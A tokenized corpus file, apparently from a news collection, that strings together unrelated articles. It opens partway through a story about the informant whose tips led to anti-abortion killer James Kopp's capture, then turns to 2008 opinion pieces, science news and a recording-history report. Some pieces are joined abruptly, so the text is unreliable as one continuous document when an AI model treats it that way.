For $ 4,000 or $ 5,000 , he suggested , Joseph could have a picture taken with him .
“ How about $ 10,000 ? ” said Joseph .
“ Maybe you ’ll have a dinner with him . ”
“ If you need the money that bad , ” Joseph said , “ how about we go to Atlantic City ?
You know how good I am .
I gamble , I give you the money . ”
On February 3 , Dennis and Loretta and Joseph and Rachel drove to the Trump Taj Mahal .
The FBI bugged Joseph ’s van for the trip — and even paid for the hotel rooms .
Listening in on the car ride , the FBI learned that Loretta used a Yahoo ! account to communicate with Kopp .
At the Taj , Rachel went shopping , Dennis stayed upstairs with the boys , and Joseph and Loretta went to the casino to gamble .
After a short time , Loretta left the table to see Luciano Pavarotti perform at the Taj ’s theater .
Loretta had given Joseph her things to hang on to .
For the next two hours , Joseph was alone with Loretta Marra ’s wallet .
Joseph rifled through everything , searching for addresses , phone numbers , anything that could lead to Kopp .
His heart pounding , he called Michael Osborn from a pay phone .
To make the search seem legal , he said the wallet had fallen to the ground accidentally .
“ I read every single note , ” Joseph says , “ and one of the numbers was in Ireland .
It was James Kopp ’s phone number in Ireland . ”
“ Help me , help me ! ” Dennis was calling .
“ The FBI ’s all over !
They ’re on the roofs ! ”
The FBI secured a warrant for the Yahoo !
account , giving them a window into almost every communication between Kopp and his friends .
They learned that Kopp was planning a return to the U.S. or Canada , and on March 21 , they spotted a message from Kopp saying he was not in Germany but in Dinan , France .
All they needed was an exact location to make the arrest .
The FBI listened on bugs as Loretta and Dennis fretted about the logistics of bringing Jim Kopp home : money , phone calls , e-mails , wiring instructions , travel from Montreal into the States .
Dennis was unusually nervous .
“ You should n’t stay online so long , ” he said .
“ Who else is using the account ?
And who established it ?
We have to get rid of the papers .
I ’ll wrap them in newspapers and throw them in the recycling boxes in the subway . ”
On March 24 , Kopp e-mailed Loretta three times about wiring arrangements : “ Ca n’t get the $ 20 without the control number .
Send the number on the e-mail account right way [ sic ] and then send $ 50 after that and $ 600 after that . ”
That same day , Loretta called Joseph .
“ I need you to come down here .
Dennis is not here .
I want to send some money . ”
With her children in the back seat , Loretta and Joseph drove through a drizzling early - spring snow to a Western Union office near Jamaica Avenue .
Loretta had everything written down .
She handed him a sheet of paper with the address of a Western Union collection point in Dinan , France .
“ Do me a favor , ” she said .
“ I ’m here with the kids .
Why do n’t you take this in ? ”
Joseph was shaking .
Here was hard evidence linking Dennis and Loretta to Kopp — and a written record of where Kopp would have to be if he wanted to pick up his money .
He could see now the whole thing would be over soon .
He handed the forms to the clerk .
“ Could you send $ 300 ? ” And then , trying to sound nonchalant , “ Could you make a copy , please , for me ? ”
Joseph folded over the copied papers a billion times and stuffed them into his sock , right under his foot .
He put his boot back on and pushed his foot and almost cried out .
It felt like a rock .
Later , Joseph would call Osborn and read him the information .
He thought he could hear the whole Earth stop on the other end of the line .
He imagined Osborn was happy .
Back in the car , Loretta seemed to understand that Joseph had crossed a line of some sort .
“ We ’re both into it , ” she told him .
“ Anything that happens , we ’re in it now together . ”
five days later , on March 29 , 2001 , Joseph was supposed to meet with Dennis and Loretta for breakfast .
As he was about to leave his apartment , his phone rang .
It was Osborn .
“ Where you going ? ”
“ I ’m going to meet Dennis . ”
“ Where is she ? ” Meaning Loretta .
“ He says she ’s at the laundromat , ” said Joseph .
“ She ’s doing laundry . ”
“ Under no condition go to see Dennis today . ”
Joseph called another friend right away , taking him up on an offer he ’d made to spend the day in Brighton Beach .
The friend picked him up at about 10 a.m .
On the way , the news radio station ticked off the headlines : James Kopp , the suspected abortion assassin , had been captured in Dinan , France .
Joseph ’s phone rang .
Dennis .
“ Help me , help me !
The FBI ’s all over !
They ’re on the roofs ! ”
They ’d already picked up Loretta on the way home from the laundromat .
Now they were on their way in to get him .
Joseph hung up .
The cell rang again .
“ Please help me !
Help me !
I got people — I got cops all over ! ”
Joseph hung up again .
It took two years of legal wrangling , but on March 18 , 2003 , James Kopp was convicted of the murder of Barnett Slepian .
He was sentenced to 25 years to life in prison .
In 2007 , he was convicted for the federal offense of blocking access to an abortion clinic and received a life sentence without parole .
Dennis and Loretta were jailed , too , for more than two years , as their cases slogged through the courts .
At first they seemed likely to face up to ten years each for obstruction of justice and five other counts , but eventually they were just indicted for harboring a fugitive , carrying sentences of only a few years .
The prosecutor tried to link Dennis more closely to the murder , claiming they had a witness who had spotted him in Barnett Slepian ’s neighborhood less than two weeks after the killing , perhaps to retrieve the gun .
But the judge declined to hear this witness and on August 21 , 2003 , sentenced Dennis and Loretta to time served .
They were free .
On their way out of the courthouse , a reporter asked Dennis if he was still part of the anti-abortion movement .
“ I am an abolitionist , ” Dennis said .
“ I have never been a member of the anti-abortion movement .
So I do n’t know what you ’re talking about . ”
Dennis ’s close friend Abe Laufgas says that Dennis and Loretta are now living “ somewhere around ” Newark , in a slum not so different from the East New York of Dennis ’s youth .
They ’re reunited with their boys ( a sister of Loretta ’s took care of them while they were in jail ) and have a third child , a girl named Lydia .
The family lives largely off the grid , says Laufgas — no cell phones , no real names .
Dennis repairs computers — “ nothing you ’d call a steady job , ” Laufgas says .
Money is tight .
“ They wo n’t take welfare from the state , ’ cause then the kids ca n’t be home - tutored , and then the state ’s going to tell them what to do .
They ’re still revolutionaries , you know ? ”
They ’re also still in touch with their friends from White Rose .
“ As a matter of fact , I was in touch with Loretta just a week ago , ” Michael Bray of Army of God told me in June .
They had been hashing out a theological matter .
“ I was working on a new catechism .
It ’s for children .
Just a fresh look at what the Christian faith is now .
And I had her review it for me .
Because I know she ’s sharp . ”
Last year , Loretta attended a court appearance of Kopp ’s and was spotted by a reporter .
“ My life will never be normal , ” she snapped .
“ Not when this country is bathed in the blood of millions of children .
All I can smell is the stench — the stench of the blood . ”
James Kopp is now several years into his sentence at a federal prison in West Virginia .
Not that long ago , he was asked why Loretta and Dennis named their second child James .
“ You ’ll have to ask Loretta , ” he said with a smile .
Joseph is 62 now — round but solid , balding and tan , almost always grinning and fidgeting .
Since 2002 , he ’s been living with Rachel in a Spanish - modern villa in a well - manicured gated community in Florida , having collected most of the $ 1 million reward for information leading to Kopp ’s capture .
He is n’t in a witness - protection program — as an informant , not a witness , he was never offered that option — but he ’s trying to live as if he were .
He and Rachel are n’t listed in public phone or address records , and he makes ample use of caller I.D. Fearing reprisals by pro-life activists , he asked to change his name and his wife ’s for this story .
When I visited Joseph earlier this year , he walked me through his place , showing off his five bedrooms , five flat - screens , a small pool , and the garden he tends during the day while Rachel works .
Much of the time , he admits , he ’s bored out of his mind .
The only thing to do here is play golf .
“ I ’ve never played golf in my life , ” he says , laughing .
“ I ’m from Brooklyn . ”
He and Dennis have n’t spoken since that phone call , the day of Dennis ’s arrest .
But Dennis did try to reach out to him from prison .
At his dining - room table , Joseph sifts through cartons of old papers and finds the letters — more than a dozen from Dennis , all in longhand .
One early letter is long , scorching , accusatory : “ You can not imagine the stunning blow and crushing spirit we have undergone by all this suffering and betrayal , ” Dennis wrote .
But months later , once a plea seemed likely for him and Loretta , Dennis ’s tone grew a little warmer .
“ It ’s taken me all this time to stop being mad at you , ” Dennis wrote .
“ But actually if I were you I would have done the same thing proberly [ sic ] , so I really ca n’t be mad at you anymore . ”
The strangest letter came in March 2003 , just after Kopp was convicted , but before Dennis and Loretta knew their own fate : “ Congratulations !
You deserve that money — all of it …
Do n’t let them screw you out of your money .
I would be more than happy to testify on your behalf . ”
It was the last letter Dennis sent .
Joseph would like to think that Dennis was trying to be nice — that he really wants the best for him .
But Rachel thinks he was just trying to get into Joseph ’s head .
Abe Laufgas says that he believes Dennis has forgiven Joseph now — at least somewhat .
“ He knows how Joseph was and how Joseph is , and he figured that the Feds put pressure on him .
And Joseph cracked .
He cracks very easy . ”
When Dennis talks about Joseph now , Laufgas says , he calls him by that old nickname , the Trembler .
After all this time , Joseph still has trouble reconciling the Dennis who was his friend with the Dennis who bombed abortion clinics .
I asked him several times why Dennis did what he did .
“ I do n’t know , ” he said .
But he may have happened on an answer in Performing in Brooklyn , a screenplay Dennis wrote back in 1997 about his life .
Before I leave , Joseph gives me a copy .
The cinematic version of Dennis Malvasi ( or “ Danny ” in the script ) is a pro-life action hero — part Rambo , part Randall Terry .
Trained in Vietnam to be a killing machine , Danny comes home to a world he does n’t understand .
He rips off some guys who are criminals anyway , and goes on the run from the police , all while performing onstage in plays .
Danny ’s life changes forever , though , when he discovers the remains of aborted fetuses in a Dumpster outside a women ’s health clinic .
He has a flashback to Vietnam , the sight of bullets tearing the womb of a pregnant villager , her baby spilling out onto the ground next to her corpse .
Danny goes to confession for the first time in years , and the priest tells him he ’d been blessed with a moment of grace :
He ’s been a soldier for the military and then a soldier of fortune .
Now he ’ll be a soldier of Christ .
That ’s when the bombings start .
In the screenplay , as in life , the cardinal comes forward to plead with our hero to surrender .
But in Dennis ’s script , the cardinal is a patsy , duped by law enforcement to lure Danny into the hands of a malevolent government .
The movie of Dennis ’s life concludes with the hero walking into the trap , but at least his conscience is clear .
“ I ’ve always followed my heart , ” Danny says at the end , on his way to prison .
The cardinal is wrong .
Danny — Dennis — is a martyr .

As corporate media reports obsessively on Joe The Plumber , who misrepresented himself to Barack Obama saying he'd be victimized by Obama 's tax plan , Americans more in need than Joe are being victimized for REAL everyday - not in hypothetical ways like Joe 's imagined fears of paying rich people 's taxes even though he is n't rich .
But in ways that jeopardize every aspect of their existence due to the collusion between the American government and the financiers it loves .
And while John McCain and Sarah Palin make this self - serving plumber the cause celebre for their campaign , increasing numbers of Americans less fortunate than Joe are losing their homes , their jobs , their health insurance , and more .
Yes , while physically imposing Joe ' Wutchagonnadoforme ' Wurtzelbacher , alias " Joe The Plumber , " bemoans his fabricated tax burden , Americans in greater need than seemingly healthy Joe , are suffering more burdensome tragedies than his phobia of spreading his wealth .
Interestingly , what Joe fears the most - the spreading of wealth ( be it real or imagined ) , may one day be his salvation - just as it was on Friday for Jocelyne Voltaire , whose home was saved by the kindness of strangers who spread THEIR wealth to her .
These strangers ' generosity toward Jocelyne defines the American spirit far better than the vitriol toward SHARING that defines the McCain campaign .
So who is Jocelyne Voltaire , and why is her story more relevant to America 's current crisis than that of plumber Joe ?
Jocelyn Voltaire is an emigre from Haiti who has lived in this country for 45 years .
She 's a United States citizen , a college graduate , and the mother of four .
She recently suffered the unbearable loss of her eldest son - a Marine who had served in the Gulf .
Atop the unthinkable pain of losing a child , Jocelyne 's Queens , New York home of twenty years was set to be auctioned on Friday ( October 17th ) , due to a predatory lender scam .
But miracles do happen !!
Thanks to the brilliant work of independent media , American News Project ( ANP ) , which captured Jocelyn 's story in the video below , and CODEPINK Women For Peace , who after seeing ANP 's video launched an appeal for funds to stop the auction , Jocelyn 's home was saved .
Miraculously , in one day , CODEPINK raised $ 30,000 from 650 patriots who stepped up to " spread THEIR wealth . "
Below is the incredible video produced by American News Project that captured the " heart " of CODEPINK and inspired Jocelyne 's patriotic " angels . "
Needless to say , corporate media was much too busy camped out at the home of plumber Joe to pay Jocelyne Voltaire any mind .
It took the efforts of independent media heroes ANP , generous spread - the - wealth patriots , and the inspired community organizing of CODEPINK to let humanity prevail .
As CODEPINK says ,
While our government has taken billions of our tax dollars to bail out the wealthy , we came together to bail out a desperate mother ...
We modeled exactly what we want our government to do - bail out families facing personal disaster , not financiers .
Now , MY FRIENDS , is n't this the REAL America we want ??!!
Not the America of corporate greed and CEO bail outs .
Not the America of Wall Street fat cats rescued by their elected and appointed government friends .
Not the America of selfishness , avoiding taxes , and only caring about ME !!
The values demonstrated by ANP and CODEPINK represent the America I want to see .
Is n't it time this government honored WE THE PEOPLE and used our taxes to take care of us rather than their friends in Forbes and Fortune ?
Permit me to share just one more story :
In the first years of the last century , my paternal grandparents , Giuseppe and Liboria Milazzo ( no , I 'm not kidding ! ! ) , emigrated to the United States from - you guessed it - Italy .
More specifically , Sicily .
As my family tells the story , my grandfather was a fairly educated man who 'd planned to become a priest - until he met his Liboria .
After coming to America , Giuseppe and Liboria settled in Rockaway Beach in the New York City borough of Queens .
They opened a tiny food store - an Italian apetito shop .
As the story goes , during the Great Depression after the Stock Market crashed , my grandparents ' customers could n't pay for their food so my grandparents extended them credit .
When the credit they extended depleted ALL the food , Giuseppe and Liboria lost their shop - as they knew all along they would .
Everyone in my family tells this story about my grandparents .
It 's not an unusual story for that time .
There were generous people at every income level who spread what little wealth they had .
Spreading the wealth was an essential part of their American dream .
My grandparents ' America was a nation of us and not me .
They were not unique .
I have friends who 've told me stories of their family 's generosity during the Depression .
They were proud of their families , as am I .
What 's troubling in America today is that people would call my grandparents losers rather than embracing their honor .
It often takes a great equalizer like the 1929 Depression or a natural disaster to level the playing field amongst people .
In 1999 when Argentina 's economy collapsed I heard stories of the wealthy digging through trash next to their former servants .
Naomi Klein , author of the monumentally important , The Shock Doctrine , tells of being in Argentina when the banks all shut down , and watching Argentines banging on the bank doors .
In those desperate times , few if any , were rich .
Everyone wanted the same thing .
They wanted to be helped .
The Argentine economy was that nation 's great equalizer , just as our economy may be ours .
Few amongst us can afford to be smug .
We are , after all , not in full control of our futures .
We never know when it will be one of us who needs help tomorrow as Jocelyne needs help right now .
Yes , Jocelyne still needs us today .
Even though the auction of Jocelyne 's home has been stopped , she still needs money to keep it and house her younger children .
She still needs support to get back on her feet .
If it 's at all possible , please spread your wealth to help Jocelyn , and participate in this American cause .
And keep the humanity going by pressuring Washington and government at every level to put the people before the predators .
In the words of CODEPINK :
Now let 's pull together in the coming months , as Jocelyne asked us to do , and move our government to do the same - bail out Main Street , not Wall Street !
To spread your much needed wealth to Jocelyn , and read this incredible story in CODEPINK 's own words , please visit here :

The babbling of young zebra finches ( right and left ) may have implications for human baby behavior .
A male bird singing a song directly to a female bird undergoes changes to the dopamine receptors on neurons in his brain that are associated with reward and pleasure .
These changes are similar to those caused by addictive drugs .
When a male bird sings a general song not directed at a female , the dopamine receptors are not triggered .
The research , done on 41 adult male zebra finches at the RIKEN Brain Science Institute in Japan , monitored the singing of the birds and found two distinctive types of singing – undirected and directed .
The undirected songs , sung by birds when they are alone , follow a pattern filled with variable notes .
When a female flies in , however , the singing becomes less variable and the tempo speeds up .
When the " love " song begins , the activation of the bird 's dopamine receptors is triggered .
Why do researchers care about bird brain dopamine and the emotional state of male finches ?
It turns out that the same type of dopamine receptors in human and other animal brains are programmed to have a positive emotional response to rewarding stimuli , such as food or sex , the researchers said .
Earlier studies have shown that in humans , sexual rewards and the rewarding aspects of video games and chocolate can trigger the same type of brain circuits that are firing in the love - struck male finch .
And these are the same circuits that are strengthened by such drugs as cocaine or amphetamine in a process that can lead to addiction .
" Despite the distant evolutionary relationship between birds and humans , " the researchers said , " it may be that during such intense social interactions as courtship , both share some similar emotional state . "
The research was published in the journal Public Library of Science .

Some in Congress claim that farm subsidies " insure a food supply for this nation . "
That 's nonsense .
It 's the free market that " insures " the food supply .
You may not know that most farmers get no subsidies .
Growers of apples , bananas , broccoli , cabbage , cantaloupe , carrots , cauliflower , grapes , lemons , limes , lettuce , onions , oranges , peaches , pears , pineapples , potatoes , spinach , squash , tangerines , tomatoes and dozens of other crops are on their own .
Among the ways in which freedom is being chipped away in Europe , one of the less obvious is the legislation of memory .
More and more countries have laws saying you must remember and describe this or that historical event in a certain way , sometimes on pain of criminal prosecution if you give the wrong answer .
What the wrong answer is depends on where you are .
In Switzerland , you get prosecuted for saying that the terrible thing that happened to the Armenians in the last years of the Ottoman empire was not a genocide .
In Turkey , you get prosecuted for saying it was .
What is state - ordained truth in the Alps is state - ordained falsehood in Anatolia .
This week a group of historians and writers , of whom I am one , has pushed back against this dangerous nonsense .
In what is being called the " Appel de Blois " , published in Le Monde last weekend , we maintain that in a free country " it is not the business of any political authority to define historical truth and to restrict the liberty of the historian by penal sanctions " .
And we argue against the accumulation of so - called " memory laws " .
First signatories include historians such as Eric Hobsbawm , Jacques Le Goff and Heinrich August Winkler .
It 's no accident that this appeal originated in France , which has the most intense and tortuous recent experience with memory laws and prosecutions .
It began uncontroversially in 1990 , when denial of the Nazi Holocaust of the European Jews , along with other crimes against humanity defined by the 1945 Nuremberg tribunal , was made punishable by law in France - as it is in several other European countries .
In 1995 , the historian Bernard Lewis was convicted by a French court for arguing that , on the available evidence , what happened to the Armenians might not correctly be described as genocide according to the definition in international law .
A further law , passed in 2001 , says the French Republic recognises slavery as a crime against humanity , and this must be given its " consequential place " in teaching and research .
A group representing some overseas French citizens subsequently brought a case against the author of a study of the African slave trade , Olivier Pétré - Grenouilleau , on the charge of " denial of a crime against humanity " .
Meanwhile , yet another law was passed , from a very different point of view , prescribing that school curricula should recognise the " positive role " played by the French presence overseas , " especially in North Africa " .
Fortunately , at this point a wave of indignation gave birth to a movement called Liberty for History ( lph- asso.fr ) , led by the French historian Pierre Nora , which is also behind the Appel de Blois .
The case against Pétré - Grenouilleau was dropped , and the " positive role " clause nullified .
But it remains incredible that such a proposal ever made it to the statute book in one of the world 's great democracies and homelands of historical scholarship .
This kind of nonsense is all the more dangerous when it comes wearing the mask of virtue .
A perfect example is the recent attempt to enforce limits to the interpretation of history across the whole EU in the name of " combating racism and xenophobia " .
A proposed " framework decision " of the justice and home affairs council of the EU , initiated by the German justice minister Brigitte Zypries , suggests that in all EU member states " publicly condoning , denying or grossly trivialising crimes of genocide , crimes against humanity and war crimes " should be " punishable by criminal penalties of a maximum of at least between one and three years imprisonment " .
Who will decide what historical events count as genocide , crimes against humanity or war crimes , and what constitutes " grossly trivialising " them ?
International humanitarian law indicates some criteria , but exactly what events qualify is a matter of often heated dispute .
The only cast - iron way to ensure EU - wide uniformity of treatment would be for the EU to agree a list - call it the Zypries List - of qualifying horrors .
You can imagine the horse - trading behind closed doors in Brussels .
( Polish official to French counterpart : " OK , we 'll give you the Armenian genocide if you give us the Ukrainian famine . " )
Pure Gogol .
Since some countries with a strong free - speech tradition , including Britain , objected to Zypries ' original draft , the proposed agreement now also says : " Member states may choose to punish only conduct which is either carried out in a manner likely to disturb public order or which is threatening , abusive or insulting . "
So in practice , individual countries will continue to do things their own way .
Despite its manifold flaws , this framework decision was approved by the European Parliament in November 2007 , but it has not been brought back to the justice and home affairs council for final approval .
I emailed the relevant representative of the current French presidency of the EU to ask why , and just received this cryptic but encouraging reply : " The FD ' Racism and xenophobia ' is not ready for adoption , as it is suspended to some outstanding parliamentary reservations . "
Merci , madame liberté : that will do till the end of this year .
Then let the Czech presidency of the EU , which covers the first half of next year , strike it down for good - with a dose of the Good Soldier Svejk 's common sense about history .
Let me be clear .
I believe it is very important that nations , states , peoples and other groups ( not to mention individuals ) should face up , solemnly and publicly , to the bad things done by them or in their name .
The West German leader Willy Brandt falling silently to his knees in Warsaw before a monument to the victims and heroes of the Warsaw Ghetto is , for me , one of the noblest images of postwar European history .
For people to face up to these things , they have to know about them in the first place .
So these subjects must be taught in schools as well as publicly commemorated .
But before they are taught , they must be researched .
The evidence must be uncovered , checked and sifted , and various possible interpretations tested against it .
It 's this process of historical research and debate that requires complete freedom - subject only to tightly drawn laws of libel and slander , designed to protect living persons but not governments , states or national pride ( as in the notorious article 301 of the Turkish penal code ) .
The historian 's equivalent of a natural scientist 's experiment is to test the evidence against all possible hypotheses , however extreme , and then submit what seems to him or her the most convincing interpretation for criticism by professional colleagues and for public debate .
This is how we get as near as one ever can to truth about the past .
How , for example , do you refute the absurd conspiracy theory , which apparently still has some currency in parts of the Arab world , that " the Jews " were behind the September 11 2001 terrorist attacks on New York ?
By forbidding anyone from saying that , on pain of imprisonment ?
No .
You refute it by refuting it .
By mustering all the available evidence , in free and open debate .
This is not just the best way to get at the facts ; ultimately , it 's the best way to combat racism and xenophobia too .
So join us , please , to see off the nanny state and its memory police .

Few experts in our society could pull off saying :
Emergency !!!
We will suffer terribly if you do n’t spend a trillion dollars right now overpaying for stuff from our friends !
No , you do n’t have time to study the problem , nor will we present an analysis for your review .
No , other experts in our field cannot actually see this problem , and there will never be data showing the problem really existed .
You just have to trust us and give us the trillion right now !!
US military experts said something similar on Iraq weapons of mass destruction , but at least they admitted we ’d eventually be able to see if they were wrong ( as they were ) .
Medical experts implicitly say something similar about the health value of the second half of medical spending that costs a trillion dollars a year , even when our best data show little value , but this is a steady problem not a sudden new problem .
Global warming experts have been trying , so far without much success , to get us to spend similar amounts on their problem , even though other experts can supposedly verify it .
Given how much less respect and deference economists get on most policy topics , relative to docs , physicists , or generals , I ’m surprised to see some economists just got away with this sort of thing .
The US has given top government economists , such as Paulson and Bernanke , well over a trillion in mostly blank checks to spend saving their Wall Street friends from ruin , supposedly to prevent another great depression .
But it seems economists looking today at the data available then just can’t find clear evidence a massive buyout was needed .
Alex Tabarrok has been reviewing the evidence here , here , and here .
Tyler responds , but as Bryan notes , not effectively .
Yes we are heading into a serious recession after housing over - investment , a recession exacerbated it seems by these dire warnings .
And yes many ( but not all ) New York investment banks were dying from terrible housing investments .
But the rest of banking and insurance industries seem to be doing all right , and economic theory certainly does n’t clearly say the economy will die if we let some investment banks go bust .
Now none of this proves Paulson and Bernanke do n’t have secret info they ’ll never be able to divulge , and deep wisdom they ’ll never be able to explain , showing we must help their friends .
But is this feeding frenzy really what you ’d expect that to look like ? :
The Treasury Department is dramatically expanding the scope of its bailout of the financial system with a plan to take ownership stakes in the nation ’s insurance companies , … Insurers … have pushed the Bush administration to include them in the plan .
…
Government officials worry that the collapse of a major insurer could further destabilize the financial system …
The new initiative underscores the growing range of problems that Treasury is scrambling to address with the $ 700 billion allocated by Congress this month .
The shape of the plan has changed repeatedly since … Paulson Jr. introduced it last month as an effort to rescue banks by buying their troubled mortgage - related assets .
That original mandate has now been pushed aside by a plan to take equity stakes in banks and insurance companies , and other businesses are lobbying to be included .
The government has been forced to expand the plan partly because the federal guarantees previously given some institutions , such as banks , have put other companies and financial sectors at a disadvantage , making them less attractive to uneasy investors .
Added 26Oct : Tyler offers more data .

Breastfeeding can be quite hard work for a baby
The sheer physical effort involved in breastfeeding may leave babies with stronger lungs well into childhood , researchers suggest .
A study of 10 - year - olds on the Isle of Wight by UK and US scientists found much better lung function in those breastfed for at least four months .
The different mechanics and duration of sucking may be partly responsible , they said , in the journal Thorax .
If so , changes to the design of bottles could mimic this effect .
No - one can argue that breastfeeding is not the best for a child , but it might be possible to make a bottle for women who are unable to breast - feed
Dr Syed Arshad
Study author Studies have established that breastfeeding protects babies from respiratory problems early in life , but the relationship with lung power later in childhood is less clear - cut .
A total of 1,456 babies from the Isle of Wight were followed all the way through to their 10th year to test this .
A third of them had been breastfed for at least four months , and on average , these children could blow out more air after taking a deep breath , and could blow it out faster .
This happened regardless of whether their mother was asthmatic or suffered from allergies .
The reason for these benefits was not as obvious , the researchers said .
Other studies have suggested that immune chemicals in breast - milk may have a protective effect against asthma .
However , the scientists from Southampton University and the College of Veterinary Medicine in Michigan State University , said that the changes in lung volume they found were not completely characteristic of an asthmatic response , suggesting that other factors might be at work .
Bottle idea Dr Syed Arshad , from Southampton and the David Hide Asthma and Allergy Research Centre on the Isle of Wight , said that the physical effort needed to extract milk from the breast might be involved .
On average , babies needed to generate three times the sucking power compared to bottle - feeding , and feeding sessions tended to last much longer .
Dr Arshad said : " What they are doing is very similar to the kind of exercises we suggest for pulmonary rehabilitation in older patients .
" I 'm not aware of anyone suggesting that this might be the reason before . "
The research team has now approached a bottle manufacturer with proposals to create a bottle which mimics the effort needed to breastfeed .
He said that it was now possible to carry out lung function tests on infants , which meant that a trial to see if it made a difference could be concluded within a year .
" No - one can argue that breastfeeding is not the best for a child , but it might be possible to make a bottle for women who are unable to breast - feed . "
Dr Elaine Vickers , from Asthma UK , said that the study added to the evidence that breastfeeding has " long - lasting benefits " for children .
She said : " While the results of the study do n't focus specifically on asthma , the researchers were able to demonstrate that children breast - fed for four months or longer had better lung function than those who were n't breast - fed at all , or who were breast - fed for less than four months .
" We currently support advice from the Department of Health , which states that where possible , babies should be exclusively breastfed for the first six months of life . "

For more than a century , since he captured the spoken words “ Mary had a little lamb ” on a sheet of tinfoil , Thomas Edison has been considered the father of recorded sound .
But researchers say they have unearthed a recording of the human voice , made by a little - known Frenchman , that predates Edison ’s invention of the phonograph by nearly two decades .
The 10 - second recording of a singer crooning the folk song “ Au Clair de la Lune ” was discovered earlier this month in an archive in Paris by a group of American audio historians .
It was made , the researchers say , on April 9 , 1860 , on a phonautograph , a machine designed to record sounds visually , not to play them back .
But the phonautograph recording , or phonautogram , was made playable — converted from squiggles on paper to sound — by scientists at the Lawrence Berkeley National Laboratory in Berkeley , Calif .
LISTEN HERE : http://graphics8.nytimes.com/audiosrc/arts/1860v2.mp3
“ This is a historic find , the earliest known recording of sound , ” said Samuel Brylawski , the former head of the recorded - sound division of the Library of Congress , who is not affiliated with the research group but who was familiar with its findings .
The audio excavation could give a new primacy to the phonautograph , once considered a curio , and its inventor , Édouard - Léon Scott de Martinville , a Parisian typesetter and tinkerer who went to his grave convinced that credit for his breakthroughs had been improperly bestowed on Edison .
Scott ’s 1860 phonautogram was made 17 years before Edison received a patent for the phonograph and 28 years before an Edison associate captured a snippet of a Handel oratorio on a wax cylinder , a recording that until now was widely regarded by experts as the oldest that could be played back .
Mr. Giovannoni ’s presentation on Friday will showcase additional Scott phonautograms discovered in Paris , including recordings made in 1853 and 1854 .
Those first experiments included attempts to capture the sounds of a human voice and a guitar , but Scott ’s machine was at that time imperfectly calibrated .
“ We got the early phonautograms to squawk , that ’s about it , ” Mr. Giovannoni said .
But the April 1860 phonautogram is more than a squawk .
On a digital copy of the recording provided to The New York Times , the anonymous vocalist , probably female , can be heard against a hissing , crackling background din .
The voice , muffled but audible , sings , “ Au clair de la lune , Pierrot répondit ” in a lilting 11 - note melody — a ghostly tune , drifting out of the sonic murk .
The hunt for this audio holy grail was begun in the fall by Mr. Giovannoni and three associates : Patrick Feaster , an expert in the history of the phonograph who teaches at Indiana University , and Richard Martin and Meagan Hennessey , owners of Archeophone Records , a label specializing in early sound recordings .
They had collaborated on the Archeophone album “ Actionable Offenses , ” a collection of obscene 19th - century records that received two Grammy nominations .
When Mr. Giovannoni raised the possibility of compiling an anthology of the world ’s oldest recorded sounds , Mr. Feaster suggested they go digging for Scott ’s phonautograms .
Historians have long been aware of Scott ’s work .
But the American researchers believe they are the first to make a concerted search for Scott ’s phonautograms or attempt to play them back .
In December Mr. Giovannoni and a research assistant traveled to a patent office in Paris , the Institut National de la Propriété Industrielle .
There he found recordings from 1857 and 1859 that were included by Scott in his phonautograph patent application .
Mr. Giovannoni said that he worked with the archive staff there to make high - resolution , preservation - grade digital scans of these recordings .
A trail of clues , including a cryptic reference in Scott ’s writings to phonautogram deposits made at “ the Academy , ” led the researchers to another Paris institution , the French Academy of Sciences , where several more of Scott ’s recordings were stored .
Mr. Giovannoni said that his eureka moment came when he laid eyes on the April 1860 phonautogram , an immaculately preserved sheet of rag paper 9 inches by 25 inches .
“ It was pristine , ” Mr. Giovannoni said .
“ The sound waves were remarkably clear and clean .
” His scans were sent to the Lawrence Berkeley lab , where they were converted into sound by the scientists Carl Haber and Earl Cornell .
They used a technology developed several years ago in collaboration with the Library of Congress , in which high - resolution “ maps ” of grooved records are played on a computer using a digital stylus .
The 1860 phonautogram was separated into 16 tracks , which Mr. Giovannoni , Mr. Feaster and Mr. Martin meticulously stitched back together , making adjustments for variations in the speed of Scott ’s hand - cranked recording .
Listeners are now left to ponder the oddity of hearing a recording made before the idea of audio playback was even imagined .
“ There is a yawning epistemic gap between us and Léon Scott , because he thought that the way one gets to the truth of sound is by looking at it , ” said Jonathan Sterne , a professor at McGill University in Montreal and the author of “ The Audible Past : Cultural Origins of Sound Reproduction . ” Scott is in many ways an unlikely hero of recorded sound .
Born in Paris in 1817 , he was a man of letters , not a scientist , who worked in the printing trade and as a librarian .
He published a book on the history of shorthand , and evidently viewed sound recording as an extension of stenography .
In a self - published memoir in 1878 , he railed against Edison for “ appropriating ” his methods and misconstruing the purpose of recording technology .
The goal , Scott argued , was not sound reproduction , but “ writing speech , which is what the word phonograph means .
” In fact , Edison arrived at his advances on his own .
There is no evidence that Edison drew on knowledge of Scott ’s work to create his phonograph , and he retains the distinction of being the first to reproduce sound .
“ Edison is not diminished whatsoever by this discovery , ” Mr. Giovannoni said .
Paul Israel , director of the Thomas A. Edison Papers at Rutgers University in Piscataway , N.J. , praised the discovery as a “ tremendous achievement , ” but called Edison ’s phonograph a more significant technological feat .
“ What made Edison different from Scott was that he was trying to reproduce sound and he succeeded , ” Mr. Israel said .
But history is finally catching up with Scott .
Mr. Sterne , the McGill professor , said : “ We are in a period that is more similar to the 1860s than the 1880s .
With computers , there is an unprecedented visualization of sound .
” The acclaim Scott sought may turn out to have been assured by the very sonic reproduction he disdained .
And it took a group of American researchers to rescue Scott ’s work from the musty vaults of his home city .
In his memoir , Scott scorned his American rival Edison and made brazen appeals to French nationalism .
“ What are the rights of the discoverer versus the improver ? ” he wrote less than a year before his death in 1879 .

Free Marijuana ! ( Movie )
By Lauri Apple in Arts & Entertainment on Nov 13 , 2008 7:05 PM
With a couple of endless wars abroad to discuss , a defenestration - inspiring economy freaking us out and so many dreamboaty candidates and First Spouses to drool over , the War on Drugs -- arguably the nation 's longest endless war ever -- did n't receive much spotlight time this election season .
But while we were hearing about Sarah Palin ’s fancywear and debating the long - ago bombing habits of Bill Ayers , tens of thousands of people ended up spending part of the campaign behind bars for committing nonviolent drug offenses .
According to NORML , in 2007 arrests for marijuana violations alone reached 872,721 – about 100 people per hour , an all - time high ( no pun intended ) .
Expect 2008 stats to surpass that figure .
Oh , and almost 90 % of those 2007 arrests were for possession only .
" Cha-ching ! " says Mr. Cash Register to Mr. Prison - Industrial Complex .
Eager to draw attention to the government ’s continuing and costly obsession with persecuting doobie - doers , Youngstown , OH - based John Holowach set about making and directing HIGH : The True Tale of American Marijuana , which explores the history and impact of our War on Drugs .
